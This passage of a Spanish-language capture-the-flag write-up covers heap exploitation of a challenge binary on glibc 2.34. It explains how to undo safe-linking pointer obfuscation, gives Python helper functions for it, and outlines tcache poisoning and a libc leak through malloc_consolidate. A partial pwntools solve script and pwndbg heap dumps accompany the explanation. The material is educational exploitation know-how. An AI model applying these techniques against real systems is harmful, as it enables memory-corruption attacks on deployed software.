+=========================
+[#] ^C
+Program received signal SIGINT, Interrupt.
+<span class="code-dark-blue">0x00007ffff7ec15ce</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x7ffff7fb4b03 &lt;_IO_2_1_stdin_+131&gt;, <span class="code-dark-cyan">nbytes</span>=1) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vis_heap_chunks
+
+0x555555559000  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000291</span>      <span class="code-dark-cyan">................</span>
+0x555555559010  <span class="code-dark-cyan">0x0002000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559020  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559030  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559040  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559050  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559060  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559070  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559080  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559090  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5555555590a0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x00005555555592a0</span>      <span class="code-dark-cyan">..........UUUU..</span>
+0x5555555590b0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5555555590c0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5555555590d0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5555555590e0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5555555590f0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559100  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559110  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559120  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559130  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559140  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559150  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559160  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559170  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559180  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559190  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5555555591a0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5555555591b0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5555555591c0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5555555591d0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5555555591e0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5555555591f0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559200  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559210  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559220  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559230  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559240  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559250  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559260  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559270  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559280  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x555555559290  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000051</span>      <span class="code-dark-magenta">........Q.......</span>
+0x5555555592a0  <span class="code-dark-magenta">0x000055500000c7a9</span>      <span class="code-dark-magenta">0x0f26857560c7a3e2</span>      <span class="code-dark-magenta">....PU.....`u.&.</span>         &lt;-- tcachebins[0x50][0/2]  
+0x5555555592b0  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
+0x5555555592c0  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
+0x5555555592d0  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
+0x5555555592e0  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000051</span>      <span class="code-dark-green">........Q.......</span>
+0x5555555592f0  <span class="code-dark-green">0x0000000555555559</span>      <span class="code-dark-green">0x0f26857560c7a3e2</span>      <span class="code-dark-green">YUUU.......`u.&.</span>         &lt;-- tcachebins[0x50][1/2]
+0x555555559300  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">................</span>
+0x555555559310  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">................</span>
+0x555555559320  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">................</span>
+0x555555559330  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000020cd1</span>      <span class="code-dark-blue">................</span>         &lt;-- Top chunk
+<span class="code-red">pwndbg&gt; </span>bins
+<span class="code-dark-blue">tcachebins</span>
+<span class="code-dark-yellow">0x50 [  2]</span>: <span class="code-dark-blue">0x5555555592a0</span> —▸ <span class="code-dark-blue">0x5555555592f0</span> ◂— 0x0
+<span class="code-dark-blue">fastbins</span>
+<span class="code-dark-yellow">0x20</span>: 0x0
+<span class="code-dark-yellow">0x30</span>: 0x0
+<span class="code-dark-yellow">0x40</span>: 0x0
+<span class="code-dark-yellow">0x50</span>: 0x0
+<span class="code-dark-yellow">0x60</span>: 0x0
+<span class="code-dark-yellow">0x70</span>: 0x0
+<span class="code-dark-yellow">0x80</span>: 0x0
+<span class="code-dark-blue">unsortedbin</span>
+<span class="code-dark-yellow">all</span>: 0x0
+<span class="code-dark-blue">smallbins</span>
+<span class="code-dark-yellow">empty</span>
+<span class="code-dark-blue">largebins</span>
+<span class="code-dark-yellow">empty</span>
+</code></pre></div><p>Lo que hace <em>safe-linking</em> es cifrar el puntero <code>fd</code> original con XOR usando como clave la dirección del <em>heap</em> desplazada 12 bits a la derecha:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">fd  = 0x00005555555592f0  
+key = 0x0000000555555559
+------------------------
+res = 0x000055500000c7a9
+</code></pre></div><p>Sin embargo, esta mitigación es inútil por cómo funciona ASLR. La clave de cifrado está formada por los bits que no cambian de las direcciones del <em>heap</em>. La dirección base del <em>heap</em> termina en <code>000</code> en hexadecimal (12 bits).</p><p>Entonces, supongamos que fugamos un puntero <code>fd</code> ofuscado: <code>0x000055500000c7a9</code>. Sabemos que <code>555</code> son parte del <code>fd</code> real:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">leak = 0x000055500000c7a9  
+key  = 0x0000000*********
+-------------------------
+fd   = 0x0000<span class="mtk5">555</span>*********
+</code></pre></div><p>Luego podemos continuar con los siguientes tres dígitos hexadecimales: <code>0x555 ^ 0x000 = 0x555</code>.</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">leak = 0x000055500000c7a9  
+key  = 0x0000000<span class="mtk5">555</span>******
+-------------------------
+fd   = 0x0000<span class="mtk5">555</span><span class="mtk4">555</span>******
+</code></pre></div><p>Y después los siguientes: <code>00c ^ 0x555 = 0x559</code>.</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">leak = 0x000055500000c7a9  
+key  = 0x0000000<span class="mtk5">555</span><span class="mtk4">555</span>***
+-------------------------
+fd   = 0x0000<span class="mtk5">555</span><span class="mtk4">555</span><span class="mtk8">559</span>***
+</code></pre></div><p>Y finalmente: <code>0x7a9 ^ 0x559 = 0x2f0</code>.</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">leak = 0x000055500000c7a9  
+key  = 0x0000000<span class="mtk5">555</span><span class="mtk4">555</span><span class="mtk8">559</span>
+-------------------------
+fd   = 0x0000<span class="mtk5">555</span><span class="mtk4">555</span><span class="mtk8">559</span><span class="mtk7">2f0</span>
+</code></pre></div><p>Por tanto, podemos obtener el <code>fd</code> original a partir del ofuscado.</p><p>Estas son dos funciones para ofuscar y desofuscar punteros (tomadas de <a href="https://fascinating-confusion.io/posts/2020/11/csr20-howtoheap-writeup/">[CSR20] HowToHeap - Libc 2.32</a>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">deobfuscate</span><span class="mtk1">(</span><span class="mtk9 mtki">x</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">l</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">int</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk9 mtki">l</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk5">-</span><span class="mtk6">4</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk1">v1</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">x</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1"> (</span><span class="mtk7 mtki">0x</span><span class="mtk6">f</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">)) </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk1">i</span>
+<span class="mtk1">        </span><span class="mtk1">v2</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1"> (</span><span class="mtk7 mtki">0x</span><span class="mtk6">f</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">12</span><span class="mtk1"> )) </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">12</span>  
+<span class="mtk1">        </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">|=</span><span class="mtk1"> (</span><span class="mtk1">v1</span><span class="mtk1"> </span><span class="mtk5">^</span><span class="mtk1"> </span><span class="mtk1">v2</span><span class="mtk1">) </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk1">i</span>
+
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">p</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">obfuscate</span><span class="mtk1">(</span><span class="mtk9 mtki">ptr</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">addr</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">int</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">ptr</span><span class="mtk1"> </span><span class="mtk5">^</span><span class="mtk1"> (</span><span class="mtk9 mtki">addr</span><span class="mtk1"> </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk6">12</span><span class="mtk1">)</span>
+</code></pre></div><h3 id="tcache-_poisoning_">Tcache <em>poisoning</em></h3><p>Como Glibc 2.34 usa Tcache, la idea es realizar un ataque de Tcache <em>poisoning</em>. Para esto, tendremos que modificar el puntero <code>fd</code> de un chunk liberado (<em>Write After Free</em>), de forma que se corrompa la lista enlazada del Tcache y crear un <em>chunk</em> en una dirección controlada.</p><p>En algún momento, tendremos que fugar una dirección de Glibc. La manera de hacer esto tiene truco. La idea es forzar a que <code>scanf</code> tenga que crear un <em>chunk</em> grande para que se aplique consolidación del <em>heap</em> (<code>malloc_consolidate</code>, más información <a href="http://tukan.farm/2016/09/04/fastbin-fever/">aquí</a>). Si llenamos el Tcache de tamaño <code>0x50</code> (7 <em>chunks</em>), el siguiente <em>chunk</em> liberado irá al <em>Fast Bin</em>. Una vez que <code>scanf</code> maneje una cadena larga (mínimo de 1024 caracteres), el <em>chunk</em> de <em>Fast Bin</em> se enviará al <em>Small Bin</em> (dejando punteros <code>fd</code> y <code>bk</code> de <code>main_arena</code>) debido a la consolidación.</p><p>Podemos probarlo así:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk9 mtki">gdbscript</span><span class="mtk5">=</span><span class="mtk4">'continue'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'[i] Enter your CRSid: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>  
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">7</span><span class="mtk1">, </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk1">i</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">input</span><span class="mtk1">(</span><span class="mtk4">'Before large string...'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendline</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'0'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">1023</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">input</span><span class="mtk1">(</span><span class="mtk4">'After large string...'</span><span class="mtk1">)</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './crsid'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './crsid': pid 953757
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './crsid', '953757', '-x', '/tmp/pwng458iat1.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+Before large string...
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>Reading symbols from <span class="code-dark-green">./crsid</span>...
+(No debugging symbols found in <span class="code-dark-green">./crsid</span>)
+Attaching to program: ./crsid, process 953757
+Reading symbols from <span class="code-dark-green">./glibc/libc.so.6</span>...
+Reading symbols from <span class="code-dark-green">./glibc/ld-2.34.so</span>...
+<span class="code-dark-blue">0x00007f3a112925ce</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x557a3afba0c0, <span class="code-dark-cyan">nbytes</span>=32) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+^C
+Program received signal SIGINT, Interrupt.
+<span class="code-dark-blue">0x00007f3a112925ce</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x7fb2c71d2b03 &lt;_IO_2_1_stdin_+131&gt;, <span class="code-dark-cyan">nbytes</span>=1) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
+26      in <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>bins
+<span class="code-dark-blue">tcachebins</span>
+<span class="code-dark-yellow">0x50 [  7]</span>: <span class="code-dark-blue">0x5594e7ebc2f0</span> —▸ <span class="code-dark-blue">0x5594e7ebc340</span> —▸ <span class="code-dark-blue">0x5594e7ebc390</span> —▸ <span class="code-dark-blue">0x5594e7ebc3e0</span> —▸ <span class="code-dark-blue">0x5594e7ebc430</span> —▸ <span class="code-dark-blue">0x5594e7ebc480</span> —▸ <span class="code-dark-blue">0x5594e7ebc4d0</span> ◂— 0x0  
+<span class="code-dark-blue">fastbins</span>
+<span class="code-dark-yellow">0x20</span>: 0x0
+<span class="code-dark-yellow">0x30</span>: 0x0
+<span class="code-dark-yellow">0x40</span>: 0x0
+<span class="code-dark-yellow">0x50</span>: <span class="code-dark-blue">0x5594e7ebc290</span> ◂— 0x0
+<span class="code-dark-yellow">0x60</span>: 0x0
+<span class="code-dark-yellow">0x70</span>: 0x0
+<span class="code-dark-yellow">0x80</span>: 0x0
+<span class="code-dark-blue">unsortedbin</span>
+<span class="code-dark-yellow">all</span>: 0x0
+<span class="code-dark-blue">smallbins</span>
+<span class="code-dark-yellow">empty</span>
+<span class="code-dark-blue">largebins</span>
+<span class="code-dark-yellow">empty</span>
+<span class="code-red">pwndbg&gt; </span>continue
+Continuing.
+</code></pre></div><p>Como vemos, tenemos un <em>chunk</em> en el <em>Fast Bin</em> en <code>0x5594e7ebc290</code>. Si pulsamos <code>ENTER</code> para enviar la cadena larga, veremos el <em>chunk</em> en el <em>Small Bin</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './crsid'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './crsid': pid 953757
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './crsid', '953757', '-x', '/tmp/pwng458iat1.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+Before large string...
+After large string...
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>^C
+Program received signal SIGINT, Interrupt.
+<span class="code-dark-blue">0x00007f3a112925ce</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x7fb2c71d2b03 &lt;_IO_2_1_stdin_+131&gt;, <span class="code-dark-cyan">nbytes</span>=1) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
+26      in <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>bins
+<span class="code-dark-blue">tcachebins</span>
+<span class="code-dark-yellow">0x50 [  6]</span>: <span class="code-dark-blue">0x5594e7ebc340</span> —▸ <span class="code-dark-blue">0x5594e7ebc390</span> —▸ <span class="code-dark-blue">0x5594e7ebc3e0</span> —▸ <span class="code-dark-blue">0x5594e7ebc430</span> —▸ <span class="code-dark-blue">0x5594e7ebc480</span> —▸ <span class="code-dark-blue">0x5594e7ebc4d0</span> ◂— 0x0  
+<span class="code-dark-blue">fastbins</span>
+<span class="code-dark-yellow">0x20</span>: 0x0
+<span class="code-dark-yellow">0x30</span>: 0x0
+<span class="code-dark-yellow">0x40</span>: 0x0
+<span class="code-dark-yellow">0x50</span>: 0x0
+<span class="code-dark-yellow">0x60</span>: 0x0
+<span class="code-dark-yellow">0x70</span>: 0x0
+<span class="code-dark-yellow">0x80</span>: 0x0
+<span class="code-dark-blue">unsortedbin</span>
+<span class="code-dark-yellow">all</span>: 0x0
+<span class="code-dark-blue">smallbins</span>
+<span class="code-dark-yellow">0x50</span>: <span class="code-dark-blue">0x5594e7ebc290</span> —▸ <span class="code-dark-magenta">0x7fb2c71d2d00 (main_arena+160)</span> ◂— 0x5594e7ebc290
+<span class="code-dark-blue">largebins</span>
+<span class="code-dark-yellow">empty</span>
+</code></pre></div><p>Ahí lo tenemos, en la misma dirección <code>0x5594e7ebc290</code>.</p><h3 id="variables-globales">Variables globales</h3><p>Podemos ver las variables globales en el siguiente espacio de memoria:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vmmap
+LEGEND: <span class="code-dark-yellow">STACK</span> | <span class="code-dark-blue">HEAP</span> | <span class="code-dark-red">CODE</span> | <span class="code-dark-magenta">DATA</span> | <span class="mtku">RWX</span> | RODATA
+    0x5594e6cb0000     0x5594e6cb1000 r--p     1000 0      ./crsid
+<span class="code-dark-red">    0x5594e6cb1000     0x5594e6cb2000 r-xp     1000 1000   ./crsid</span>
+    0x5594e6cb2000     0x5594e6cb3000 r--p     1000 2000   ./crsid
+    0x5594e6cb3000     0x5594e6cb4000 r--p     1000 2000   ./crsid
+<span class="code-dark-magenta">    0x5594e6cb4000     0x5594e6cb5000 rw-p     1000 3000   ./crsid</span>
+<span class="code-dark-blue">    0x5594e7ebc000     0x5594e7edd000 rw-p    21000 0      [heap]</span>
+<span class="code-dark-magenta">    0x7fb2c6fe3000     0x7fb2c6fe6000 rw-p     3000 0      [anon_7fb2c6fe3]</span>
+    0x7fb2c6fe6000     0x7fb2c7012000 r--p    2c000 0      ./glibc/libc.so.6
+<span class="code-dark-red">    0x7fb2c7012000     0x7fb2c7179000 r-xp   167000 2c000  ./glibc/libc.so.6</span>
+    0x7fb2c7179000     0x7fb2c71ce000 r--p    55000 193000 ./glibc/libc.so.6
+    0x7fb2c71ce000     0x7fb2c71cf000 ---p     1000 1e8000 ./glibc/libc.so.6
+    0x7fb2c71cf000     0x7fb2c71d2000 r--p     3000 1e8000 ./glibc/libc.so.6
+<span class="code-dark-magenta">    0x7fb2c71d2000     0x7fb2c71d5000 rw-p     3000 1eb000 ./glibc/libc.so.6</span>
+<span class="code-dark-magenta">    0x7fb2c71d5000     0x7fb2c71e4000 rw-p     f000 0      [anon_7fb2c71d5]</span>
+    0x7fb2c71e4000     0x7fb2c71e5000 r--p     1000 0      ./glibc/ld-2.34.so
+<span class="code-dark-red">    0x7fb2c71e5000     0x7fb2c7209000 r-xp    24000 1000   ./glibc/ld-2.34.so</span>
+    0x7fb2c7209000     0x7fb2c7213000 r--p     a000 25000  ./glibc/ld-2.34.so
+    0x7fb2c7213000     0x7fb2c7215000 r--p     2000 2e000  ./glibc/ld-2.34.so
